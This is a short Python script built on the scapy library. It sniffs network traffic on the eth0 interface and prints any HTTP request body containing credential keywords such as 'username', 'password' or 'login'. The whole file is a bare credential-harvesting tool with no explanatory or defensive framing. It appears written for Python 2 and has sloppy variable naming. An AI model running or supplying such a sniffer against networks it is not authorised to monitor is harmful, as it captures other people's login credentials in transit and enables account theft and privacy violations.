#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packed)

def process_sniffed_packed(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keyoards = ["username", "user", "password", "pass", "login"]
            for keyoards in keyoards:
                if keyoards in load:
                    print(load)
                    break
sniff("eth0")